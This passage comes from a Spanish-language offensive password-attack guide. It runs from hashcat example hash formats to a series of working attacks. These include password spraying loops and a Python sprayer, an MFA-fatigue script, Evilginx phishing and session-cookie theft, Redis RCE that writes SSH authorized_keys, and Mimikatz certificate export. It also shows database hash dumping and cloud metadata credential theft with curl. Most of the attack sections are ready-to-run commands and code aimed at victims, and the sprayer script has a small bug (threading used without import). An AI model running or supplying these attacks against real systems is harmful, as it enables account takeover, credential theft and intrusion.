# RAR5 (hashcat 12600)
$rar5$16$abcdef1234567890abcdef1234567890$16$abcdef1234567890abcdef1234567890$12$abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef123456789012345678

# PKZIP Compressed (hashcat 17200)
$pkzip2$1*2*3*0*1*abcdef12*abcd*2*0*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# PKZIP Uncompressed (hashcat 17210)
$pkzip2$1*2*3*0*0*abcdef12*abcd*2*0*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# KeePass 1/2 (hashcat 13400)
$keepass$*2*6000*0*abcdef1234567890abcdef1234567890*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# DPAPI v1 (hashcat 15300)
$dpapi$v1*guid*abcdef1234567890abcdef1234567890*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# DPAPI v2 (hashcat 15310)
$dpapi$v2*guid*abcdef1234567890abcdef1234567890*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
```

### 12.11 Hashes de Wallet y Crypto

```bash
# Bitcoin/Litecoin wallet.dat (hashcat 11300)
$bitcoin$96$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef

# Ethereum Wallet PBKDF2 (hashcat 15700)
$ethereum$w$c*10000*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Ethereum Pre-Sale Wallet (hashcat 12300)
$ethereum$presale$w$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Electrum Wallet 1-5 (hashcat 11800)
$electrum$1*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# LastPass Vault (hashcat 26300)
$lp$vault$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# 1Password 1-3 (hashcat 8200)
$1password$1*10000*abcdef1234567890abcdef1234567890*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Blockchain.com Wallet (hashcat 12700)
$blockchain$v1$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef120000

# Bitwarden (hashcat 21000)
$bitwarden$1$100000$abcdef1234567890abcdef1234567890$32$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Password Safe v3 (hashcat 5200)
$pwsafe$3$10000$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Password Safe v2 (hashcat 9000)
$pwsafe$2$1000$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
```

### 12.12 Hashes de SAP, Cisco y Network

```bash
# SAP CODVN B (BCODE) (hashcat 7700)
$SAPCODVN2$10000$abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# SAP CODVN F/G (PASSCODE) (hashcat 7800)
$SAPCODVN2$10000$abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# SAP CODVN H (PWDSALTEDHASH) (hashcat 10300)
$SAPCODVN2$10000$abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Citrix NetScaler (hashcat 8100)
abcdef1234567890abcdef1234567890
aabbccddee1122334455667788990011

# Citrix NetScaler SHA256 (hashcat 22200)
abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
aabbccddee112233445566778899001122334455667788990011223344556677889900

# GRUB 2 (hashcat 7200)
grub.pbkdf2.sha512.10000.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Radmin2 (hashcat 9900)
abcdef1234567890abcdef1234567890
aabbccddee1122334455667788990011

# FileZilla Server >= 0.9.55 (hashcat 15000)
abcdef1234567890abcdef1234567890
aabbccddee1122334455667788990011

# FileZilla Server >= 1.2.0 (hashcat 16700)
$filezilla$1$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
```

### 12.13 Hashes de Mensajería y Comunicación

```bash
# CRAM-MD5 (hashcat 10200)
abcdef1234567890abcdef1234567890 user@domain.com
aabbccddee1122334455667788990011 admin@empresa.com

# SIP digest (hashcat 11400)
$sip$*abcdef1234567890abcdef1234567890*md5*domain.com*user*challenge*response
$sip$*aabbccddee1122334455667788990011*sha256*empresa.com*admin*abc123*def456

# TOTP (hashcat 16100)
$totp$sha1$30$6$abcdef1234567890abcdef1234567890abcdef1234
$totp$sha256$30$8$aabbccddee1122334455667788990011223344556677

# JWT (hashcat 16500)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNqP3No3T3F0v4P5Q6T7U8V9W0X1Y2Z3A4B5C

# Chrome 74+ (hashcat 15400)
$chrome$*encrypted_key*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Chromium 80+ (hashcat 16400)
$chromium$*encrypted_key*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Telegram Desktop < 2.1.14 (hashcat 22600)
$telegram$1*abcdef1234567890abcdef1234567890*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Mozilla Master Password (hashcat 26100)
$mozilla$*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
```

---

## 13. Password Spraying a Escala

### 13.1 Password Spraying Automatizado con RustScan + [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra)

```bash
# Escaneo masivo de servicios
rustscan -a 192.168.1.0/24 --range 22,3389,445,1433,3306,5432,6379,27017 -g

# Password spraying en toda la red contra SSH
for ip in $(cat live_hosts.txt); do
    hydra -L users.txt -p "Spring2024!" -t 4 -f ssh://$ip >> results.txt
    sleep 30
done
```

### 13.2 Spraying con Kerberos (sin tocar servicios web)

```bash
# Kerberos password spraying desde Linux
for password in $(cat passwords.txt); do
    echo "[*] Probando: $password"
    for user in $(cat users.txt); do
        impacket-getTGT -dc-ip 192.168.1.100 dominio.com/$user:"$password" -no-pass 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] CREDENCIALES VALIDAS: $user:$password"
            echo "$user:$password" >> valid_creds.txt
        fi
    done
    sleep 2
done

# O usando kerbrute (mucho más rápido)
kerbrute passwordspray -d dominio.com --dc 192.168.1.100 users.txt "Spring2024!"
kerbrute passwordspray -d dominio.com --dc 192.168.1.100 users.txt passwords.txt
```

### 13.3 Spraying contra Office 365 / [azure ad](../raw/hybr1d-1d3nt1ty.md)

```bash
# Usando o365spray
git clone https://github.com/0xZDH/o365spray
cd o365spray
python3 o365spray.py --domain empresa.com --spray --userfile users.txt --passfile passwords.txt

# Usando MSOLSpray
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!" -Verbose

# Usando FireProx + o365spray (rotación de IP via AWS API Gateway)
python3 o365spray.py --domain empresa.com --spray --userfile users.txt --passfile passwords.txt --fireprox
```

### 13.4 Spraying contra [aws](../raw/cl0ud-h4ck1ng.md#aws) Console

```bash
# Enumerar usuarios IAM + password spray
python3 aws_consoler.py --username admin --password "Passw0rd!"

# Con aws-key-spray
git clone https://github.com/random-robbie/aws-key-spray
cd aws-key-spray
python3 aws-key-spray.py --access-keys keys.txt --password "Passw0rd!"
```

### 13.5 Custom Sprayer en [python](../raw/pyth0n-f0r-h4ck1ng.md)

```python
#!/usr/bin/env python3
import requests
import sys
from threading import Thread, Semaphore
from time import sleep

class Sprayer:
    def __init__(self, users, password, url, delay=5):
        self.users = users
        self.password = password
        self.url = url
        self.delay = delay
        self.sem = Semaphore(3)
        self.valid = []

    def try_login(self, user):
        self.sem.acquire()
        try:
            data = {'username': user, 'password': self.password}
            r = requests.post(self.url, data=data, timeout=10, allow_redirects=False)
            if r.status_code == 302 and 'dashboard' in r.headers.get('Location', ''):
                self.valid.append((user, self.password))
                print(f"[+] VALID: {user}:{self.password}")
        except:
            pass
        self.sem.release()

    def spray(self):
        for user in self.users:
            t = Thread(target=self.try_login, args=(user,))
            t.start()
            sleep(self.delay)
        for t in threading.enumerate():
            if t != threading.current_thread():
                t.join()
        return self.valid

if __name__ == '__main__':
    users = [line.strip() for line in open('users.txt')]
    s = Sprayer(users, 'Spring2024!', 'https://portal.empresa.com/login')
    valid = s.spray()
    for u, p in valid:
        print(f"GUARDADO: {u}:{p}")
```

---

## 14. MFA/2FA Bypass en Password Attacks

### 14.1 Bypass de TOTP (Time-based OTP)

```bash
# Si tenés el shared secret del TOTP, generás tokens ilimitados
# Ej: si comprometiste el backup de códigos o la base de datos

# Generar TOTP manualmente con oathtool
oathtool --totp -b GAXG2MJENFXG4LJB
oathtool --totp -b 'BASE32SECRET'  # Obtener token actual

# Fuerza bruta de TOTP de 6 dígitos (1M combinaciones)
for i in $(seq -w 000000 999999); do
    echo $i >> totp_codes.txt
done

# Si tenés acceso a la DB de la app, podés extraer secrets
# Ej: Google Authenticator migration format
# Extraer de la base de datos:
sqlite3 otp.db "SELECT username, secret FROM otp_tokens;"
```

### 14.2 Bypass de SMS 2FA con SS7

```bash
# Si tenés acceso a la red SS7 (Sigtran), podés interceptar SMS
# No es práctico para la mayoría de los casos
# Herramientas: SS7 M3UA, SIGTRAN toolkit

# Alternativa: clonar la SIM de la víctima
# Usar SIM cloning tools + programar SIM blank
```

### 14.3 Bypass de Push Notifications (MFA Fatigue)

```bash
# Enviar múltiples push notifications hasta que la víctima acepte por error
# Herramientas: MSOLSpray, o365spray con modo MFA fatigue

# Con o365spray en modo fatigue
python3 o365spray.py --domain empresa.com --spray --userfile users.txt --passfile passwords.txt --mfa-fatigue

# Script custom para MFA fatigue
import requests
from time import sleep

def mfa_fatigue(email, password):
    session = requests.Session()
    # Login inicial
    r = session.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data={
        'client_id': 'CLIENT_ID',
        'username': email,
        'password': password,
        'grant_type': 'password',
    })
    # Enviar 10 push notifications seguidas
    for i in range(10):
        # Forzar challenge MFA
        r = session.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data={
            'client_id': 'CLIENT_ID',
            'username': email,
            'password': password,
            'grant_type': 'password',
            'claims': '{"access_token":{"xms_cc":{"values":["MFA_ATTESTATION"]}}}'
        })
        sleep(1)
    print(f"MFA Fatigue attacks enviados para {email}")
```

### 14.4 Bypass de [phishing](../raw/ph1sh1ng.md)-Resistant MFA (FIDO2/WebAuthn)

```bash
# El phishing-resistant MFA (FIDO2, YubiKey) es el más difícil de bypassear
# Técnicas posibles:
# 1. Compromiso del endpoint (si la víctima ya está autenticada)
# 2. Token theft de la sesión ya autenticada (cookie stealing)
# 3. Evilginx2 con soporte para WebAuthn (algunas implementaciones)

# Evilginx2 phishlet para FIDO2
# Si la implementación no verifica origin correctamente:
phishlet:
  name: "o365_fido2"
  proxy_hosts:
    - phish_sub: "login"
      orig_sub: "login"
      domain: "microsoftonline.com"
      session: true
      is_landing: true
  # El phishlet captura la assertion de WebAuthn y la reenvía
```

### 14.5 Session Cookie Theft (post-MFA)

```bash
# Una vez que la víctima pasó MFA, robar la cookie de sesión
# Con Evilginx2:
lures create o365
lures get-url 0
# Enviar URL a víctima → completa login + MFA → cookie queda en evilginx2

# Extraer cookie de evilginx2
cat ~/.evilginx/cookies/*
# Cookie de sesión de Office 365
# Importar en navegador con EditThisCookie
```

---

## 15. GPU [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)) para [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) Distribuido

### 15.1 Multi-GPU Local Setup

```bash
# Ver GPUs disponibles
hashcat -I

# Distribuir work entre GPUs
# GPU 0 corre modo 1000, GPU 1 corre modo 3000
hashcat -m 1000 -a 0 -d 1 hashes.txt rockyou.txt &  # GPU 0
hashcat -m 3000 -a 0 -d 2 hashes.txt rockyou.txt    # GPU 1

# Todas las GPUs para el mismo trabajo
hashcat -m 1000 -a 0 -d 1,2,3 hashes.txt rockyou.txt -w 4

# Distribuir hashes entre GPUs (partir el archivo)
split -n l/4 ntlm_hashes.txt chunk_
hashcat -m 1000 -a 0 -d 1 chunk_aa rockyou.txt &
hashcat -m 1000 -a 0 -d 2 chunk_ab rockyou.txt &
hashcat -m 1000 -a 0 -d 3 chunk_ac rockyou.txt &
hashcat -m 1000 -a 0 -d 4 chunk_ad rockyou.txt &
```

### 15.2 Multi-Node Setup con Hashtopolis

```bash
# Hashtopolis es un frontend web para gestionar clusters de cracking
# Componentes:
# - Server (PHP + MySQL)
# - Agent (cliente que corre hashcat)
# - UI web para gestionar tareas

# Instalar servidor
git clone https://github.com/s3inlc/hashtopolis
cd hashtopolis/src/server
composer install
cp config.php.example config.php
# Configurar DB en config.php
# Importar schema.sql
# Acceder a http://server/hashtopolis

# Instalar agente en cada nodo
# Descargar hashtopolis-agent de releases
# Configurar agent.json:
{
    "serverUrl": "http://hashtopolis-server/api",
    "token": "TOKEN_DE_AGENTE",
    "uuid": "UUID_UNICO_POR_NODO"
}
./hashtopolis-agent &

# Crear tarea en UI:
# - Seleccionar hashes
# - Seleccionar attack mode (0-9)
# - Seleccionar wordlist
# - Seleccionar reglas
# - Asignar a agentes
# - Ver progreso en tiempo real

# Ejemplo de tarea con 100M hashes NTLM distribuidos
# entre 10 nodos con 4 GPUs cada uno = 40 GPUs en paralelo
```

### 15.3 GPU Selection por Tipo de [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)

```bash
# Distintos algoritmos tienen distinto rendimiento en distintas GPUs
# bcrypt es más rápido en CPU que en GPU (por el diseño del algoritmo)

# Para hashes rápidos (NTLM, MD5, SHA1) - NVIDIA RTX 4090
# Velocidad: ~300 GH/s para NTLM, ~80 GH/s para MD5
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -w 4

# Para hashes lentos (bcrypt, PBKDF2) - AMD RX 7900 XTX
# Velocidad: ~200 kH/s para bcrypt, ~1 MH/s para PBKDF2-SHA256
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -w 3

# Para hashes de documentos (Office, PDF) - RTX 4090
# Velocidad: ~10 kH/s para Office 2013
hashcat -m 9600 -a 0 hashes.txt rockyou.txt -w 3

# Combos ideales:
# NVIDIA RTX 4090: NTLM, MD5, SHA1, SHA256, SHA512, LM
# AMD RX 7900 XTX: bcrypt, PBKDF2, scrypt
# Intel ARC A770: WPA/WPA2, Kerberos
# Apple M2 Ultra: SHA512crypt, sha256crypt
```

### 15.4 Cracking en la Nube ([cloud](../raw/cl0ud-h4ck1ng.md) GPU)

```bash
# AWS EC2 GPU instances
# P3.2xlarge (1x Tesla V100) ~ $3.06/hr
# P4d.24xlarge (8x A100) ~ $32.77/hr
# G5.xlarge (1x A10) ~ $1.006/hr

# Azure ND-series
# ND40rs_v2 (8x V100) ~ $24/hr
# NC6s_v3 (1x V100) ~ $3/hr

# Google Cloud
# A2-highgpu-1g (1x A100) ~ $3.50/hr
# L4 GPU instances

# Script para deploy automático en AWS:
# 1. Lanzar instancia con AMI de hashcat pre-configurada
# 2. Montar EFS con wordlists y hashes
# 3. Ejecutar hashcat
# 4. Subir resultados a S3
# 5. Terminar instancia

# Usar Terraform para gestionar clusters
# terraform/aws/main.tf:
resource "aws_instance" "cracking_node" {
  count         = var.node_count
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "p3.2xlarge"
  user_data     = templatefile("bootstrap.sh", {
    hashfile  = var.hashfile
    wordlist  = var.wordlist
    mode      = var.hash_mode
  })
  tags = { Name = "cracking-node-${count.index}" }
}
```

### 15.5 Monitoreo de Cluster

```bash
# Script de monitoreo con netdata o prometheus
# Netdata:
bash <(curl -Ss https://my-netdata.io/kickstart.sh)
# Dashboards: GPU temp, hash rate, power draw

# O con script simple:
watch -n 5 'nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used --format=csv'
watch -n 10 'hashcat --status'

# Notificaciones por Telegram cuando se crackea un hash
# Usar --status-timer y parsear output
```

---

## 16. Ataques a Bases de Datos (Credential Extraction)

### 16.1 MSSQL — Extracción de Hashes y Linked Servers

```bash
# Encontrar MSSQL en la red
nmap -p 1433 192.168.1.0/24 --open
crackmapexec mssql 192.168.1.0/24 -u sa -P passwords.txt

# Extraer hashes de usuarios de SQL Server
# Con credenciales SA:
impacket-mssql -port 1433 -windows-auth dominio.com/sa:Pass123@192.168.1.100 -q "SELECT name, password_hash FROM sys.sql_logins"

# Extraer con xp_cmdshell (si está habilitado)
EXEC xp_cmdshell 'whoami'

# Si no está habilitado, habilitarlo:
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Extraer hashes de usuarios de Windows conectados a SQL
SELECT name, sid FROM sys.server_principals WHERE type IN ('U', 'G');

# Linked Servers — escalar a otros servidores
SELECT * FROM sys.servers;  # Ver linked servers
# Ejecutar query en linked server remoto
SELECT * FROM OPENQUERY([REMOTE_SERVER], 'SELECT name FROM master.sys.sql_logins')

# Crawlear linked servers recursivamente
-- Nivel 1
SELECT * FROM OPENQUERY(LinkedSvr1, 'SELECT * FROM OPENQUERY(LinkedSvr2, ''SELECT name FROM sys.sql_logins'')')
```

### 16.2 Oracle — Datapump y Extracción de Hashes

```bash
# Enumerar usuarios Oracle
SELECT username, password FROM dba_users;
SELECT username, password_hash FROM dba_users;

# Extraer hashes de Oracle
# Los hashes están en la vista DBA_USERS
# Formato: 'S:hash' para Oracle 10g, 'T:hash' para Oracle 11g/12c

# Usar impdp (Data Pump) para extraer datos
impdp system/pass@ORCL directory=DATA_PUMP_DIR dumpfile=users.dmp include=USER

# Extraer via SQL*Plus
sqlplus system/pass@ORCL
SQL> SELECT 'ALTER USER ' || username || ' IDENTIFIED BY "Pass123!";' FROM dba_users;
# Cambiar todas las passwords (para acceso posterior)

# Extraer hashes de listener Oracle
lsnrctl services LISTENER
# Los passwords de listener están en listener.ora
cat $ORACLE_HOME/network/admin/listener.ora
# PASSWORDS_LISTENER = hash
```

### 16.3 MySQL / MariaDB — Extracción de Hashes

```bash
# Con credenciales, extraer todos los hashes
mysql -u root -p -e "SELECT user, host, authentication_string FROM mysql.user;"
mysql -u root -p -e "SELECT user, host, password FROM mysql.user;" # MySQL < 5.7

# Crackear hash MySQL
# MySQL 4.1+ (hashcat 300)
hashcat -m 300 mysql_hash.txt rockyou.txt

# MySQL 5.x SHA1 (hashcat 11200)
hashcat -m 11200 mysql_sha1.txt rockyou.txt

# MySQL 8.x (hashcat 20700)
hashcat -m 20700 mysql8_hash.txt rockyou.txt

# Extraer todo de la DB incluyendo data sensible
mysqldump -u root -p --all-databases > full_dump.sql

# Buscar credenciales en la base de datos
mysql -u root -p -e "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%cred%' OR column_name LIKE '%token%' OR column_name LIKE '%secret%';"
```

### 16.4 PostgreSQL — Extracción de Hashes

```bash
# Extraer hashes de usuarios
psql -U postgres -c "SELECT usename, passwd FROM pg_shadow;"

# Extraer todos los roles y contraseñas
psql -U postgres -c "SELECT rolname, rolpassword FROM pg_authid;"

# Crackear hash PostgreSQL (hashcat 11100)
hashcat -m 11100 pg_hash.txt rockyou.txt

# PostgreSQL SCRAM-SHA-256 (hashcat 19000)
hashcat -m 19000 pg_scram.txt rockyou.txt

# Buscar tablas con datos sensibles
psql -U postgres -c "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name ~* '(pass|cred|secret|token|key)';"
```

### 16.5 Redis — AUTH Bypass y [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

```bash
# Redis sin autenticación (muy común)
redis-cli -h 192.168.1.100
redis-cli -h 192.168.1.100 -p 6379
# Si no hay AUTH, tenés acceso completo

# Extraer todo
redis-cli -h 192.168.1.100 KEYS '*'
redis-cli -h 192.168.1.100 DUMP keyname
redis-cli -h 192.168.1.100 CONFIG GET requirepass

# Cracking Redis AUTH
hydra -P passwords.txt redis://192.168.1.100

# Redis RCE si no hay AUTH
redis-cli -h 192.168.1.100 EVAL "return redis.call('set','x','y')" 0
redis-cli -h 192.168.1.100 CONFIG SET dir /root/.ssh/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename authorized_keys
redis-cli -h 192.168.1.100 SAVE
# Después SSH con tu key

# Buscar credenciales guardadas en Redis
redis-cli -h 192.168.1.100 KEYS '*pass*'
redis-cli -h 192.168.1.100 KEYS '*cred*'
redis-cli -h 192.168.1.100 KEYS '*token*'
redis-cli -h 192.168.1.100 KEYS '*session*'
```

### 16.6 MongoDB — Credential Extraction

```bash
# Conectar sin auth (muy común en dev)
mongo mongodb://192.168.1.100:27017
mongo mongodb://192.168.1.100:27017/admin

# Con auth
mongo mongodb://admin:pass@192.168.1.100:27017/admin

# Extraer todos los usuarios
use admin
db.system.users.find().pretty()

# Extraer toda la data
use config
db.settings.find().pretty()

# Buscar credenciales en colecciones
db.getCollectionNames().forEach(function(c) {
    var docs = db.getCollection(c).find({$or: [
        {password: {$exists: true}},
        {pass: {$exists: true}},
        {secret: {$exists: true}},
        {token: {$exists: true}},
        {credential: {$exists: true}},
    ]}).limit(10);
    if (docs.hasNext()) print(c + ": " + JSON.stringify(docs.next()));
});

# Brute force MongoDB
hydra -l admin -P passwords.txt mongodb://192.168.1.100
```

---

## 17. Ataques a Certificados

### 17.1 PFX/P12 Extraction y [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

```bash
# Extraer hash de un archivo PKCS12 (.pfx/.p12)
pfx2john server.pfx > pfx_hash.txt
john pfx_hash.txt --wordlist=rockyou.txt

# O con john2hashcat
python pfx2hashcat.py server.pfx

# Crackear con hashcat (modo 26200 - PKCS12)
hashcat -m 26200 pfx_hash.txt rockyou.txt

# Extraer certificado y clave privada del PFX
# Si tenés la passphrase:
openssl pkcs12 -in cert.pfx -nocerts -out private.pem
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem
openssl pkcs12 -in cert.pfx -out all.pem

# Extraer sin passphrase (si el cifrado es débil)
# Usar pfx_crack.py
python pfx_crack.py -f cert.pfx -w rockyou.txt

# Smartcard authentication hash cracking
# Extraer hash del PIN de la smartcard
# Usar John con formato "raw-sha512" para algunos casos
```

### 17.2 Certificate [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) Cracking para Smartcard Auth

```bash
# Los certificados de smartcard tienen PIN protection
# El PIN se verifica localmente, no en red

# Extraer hash del PIN (depende del middleware)
# Para YubiKey PIV:
yubico-piv-tool -a verify-pin -P <PIN>

# Para smartcards genéricos (PKCS#11):
pkcs11-tool --login --pin <PIN> --list-objects

# Crackear PIN de smartcard con hashcat
# Si tenés acceso al hash almacenado localmente

# Extraer hash del módulo PKCS#11
# Los PIN hashes suelen estar en:
# /etc/opensc/*.conf
# ~/.eid/authorized_certificates
```

### 17.3 [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) CS Certificate Theft

```bash
# Extraer certificados de usuario desde Windows
# Certificados en almacén personal (MY)
certutil -user -store My

# Exportar certificado con clave privada
certutil -user -p "Pass123!" -exportPFX MY "CERTIFICATE_SHA1" cert.pfx

# Extraer certificados de máquina
certutil -store My
certutil -p "Pass123!" -exportPFX MY "CERTIFICATE_SHA1" cert.pfx

# Con Mimikatz
mimikatz # crypto::certificates /export /systemstore:My
mimikatz # crypto::certificates /export /systemstore:CA
mimikatz # crypto::certificates /export /systemstore:ROOT

# Buscar certificados en disco
dir /s *.pfx *.p12 *.pem *.cer *.crt 2>nul
dir /s %APPDATA%\Microsoft\SystemCertificates\My\Certificates\
```

---

## 18. [cloud](../raw/cl0ud-h4ck1ng.md) Credential Attacks

### 18.1 [aws](../raw/cl0ud-h4ck1ng.md#aws) Secret Key [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

```bash
# AWS secret keys tienen formato:
# AKIAIOSFODNN7EXAMPLE (access key ID)
# wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY (secret access key)

# Extraer secret keys de archivos de configuración
# ~/.aws/credentials
# ~/.aws/config
# C:\Users\%username%\.aws\credentials

# Verificar si una key es válida
aws sts get-caller-identity --profile leaked_profile

# Crackear secret key con hashcat
# AWS utiliza HMAC-SHA256 para firmar requests
# Si tenés un request firmado, podés crackear la secret key

# Extraer secret keys de environment variables
# Linux: env | grep -i aws
# Windows: set | findstr AWS

# Buscar secret keys en repositorios
# TruffleHog
trufflehog --regex --entropy=True github.com/user/repo

# GitLeaks
gitleaks detect --source=/path/to/repo --verbose
```

### 18.2 [azure ad](../raw/hybr1d-1d3nt1ty.md) Token Cracking

```bash
# Azure AD tokens (JWT)
# Formato: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...

# Crackear JWT si usa HMAC (HS256) en vez de RSA (RS256)
# El secret del JWT se puede crackear con hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# Extraer tokens de Azure desde el sistema
# Azure CLI tokens
cat ~/.azure/accessTokens.json
# Azure PowerShell tokens
cat ~/.azure/TokenCache.dat

# Microsoft Graph tokens
# Buscar en:
# %LOCALAPPDATA%\Microsoft\TokenBroker
# %LOCALAPPDATA%\Microsoft\OneAuth

# Refresh tokens de Azure AD
# Si tenés un refresh token, podés generar access tokens nuevos
az login --identity --refresh-token TOKEN

# Crackear service principal credentials
# Si encontrás un client_secret en texto plano:
# appsettings.json, web.config, .env, docker-compose.yml
grep -r "client_secret" . --include="*.json" --include="*.config" --include="*.env"
```

### 18.3 [gcp](../raw/cl0ud-h4ck1ng.md#gcp) Service Account Key Cracking

```bash
# GCP service account keys son archivos JSON con clave privada RSA
# El JSON contiene:
# {
#   "type": "service_account",
#   "project_id": "project-123",
#   "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...",
#   "client_email": "sa@project.iam.gserviceaccount.com",
#   ...
# }

# La private key tiene passphrase (opcional)
# Si está protegida por passphrase, crackear con john:
ssh2john.py private_key.pem > gcp_key_hash.txt
john gcp_key_hash.txt --wordlist=rockyou.txt

# Extraer service account keys de instancias GCP
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Listar todas las service accounts en un proyecto
gcloud iam service-accounts list --project=PROJECT_ID

# Buscar keys almacenadas en Cloud Storage
gsutil ls gs://bucket-name/
gsutil cat gs://bucket-name/keys/service-account.json
```

### 18.4 Cloud Environment [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) Extraction

```bash
# Las clouds suelen exponer credenciales via metadata endpoints

# AWS (169.254.169.254)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME

# GCP (169.254.169.254)
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure (169.254.169.254)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 19. Archive Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) (ZIP, RAR, 7z, PDF, Office)

### 19.1 ZIP Password Cracking

```bash
# Extraer hash de ZIP
# ZIP tradicional (PKZIP)
zip2john encrypted.zip > zip_hash.txt
zip2john -o file_inside.zip encrypted.zip > zip_hash.txt

# ZIP con AES
zip2john -a encrypted.zip > zip_aes_hash.txt

# Crackear con john
john zip_hash.txt --wordlist=rockyou.txt

# Crackear con hashcat
# PKZIP Compressed (hashcat 17200)
hashcat -m 17200 zip_hash.txt rockyou.txt

# PKZIP Uncompressed (hashcat 17210)
hashcat -m 17210 zip_hash.txt rockyou.txt

# PKZIP Compressed Multi-File (hashcat 17220)
hashcat -m 17220 zip_hash.txt rockyou.txt

# PKZIP Mixed Multi-File (hashcat 17225)
hashcat -m 17225 zip_hash.txt rockyou.txt

# PKZIP Uncompressed Multi-File (hashcat 17230)
hashcat -m 17230 zip_hash.txt rockyou.txt

# Con fcrackzip (más simple pero más lento)
fcrackzip -D -p rockyou.txt encrypted.zip
fcrackzip -b -l 4-8 -u encrypted.zip  # Brute force 4-8 chars

# Con john + reglas
john --wordlist=rockyou.txt --rules zip_hash.txt

# ZIP con archivos conocidos (known-plaintext attack)
# Si tenés un archivo del ZIP sin cifrar
pkcrack -c "known_file.txt" -p known_file.txt -C encrypted.zip -P known.zip -d decrypted.zip
```

### 19.2 RAR Password Cracking

```bash
# Extraer hash de RAR3
rar2john encrypted.rar > rar_hash.txt

# RAR5
/opt/john/run/rar2john.pl encrypted.rar > rar5_hash.txt
# O usar rar2john incluido en john
john rar_hash.txt --wordlist=rockyou.txt

# Crackear con hashcat
# RAR3-hp (hashcat 12500)
hashcat -m 12500 rar_hash.txt rockyou.txt

# RAR5 (hashcat 12600)
hashcat -m 12600 rar5_hash.txt rockyou.txt

# Con unrar + script
for pass in $(cat rockyou.txt); do
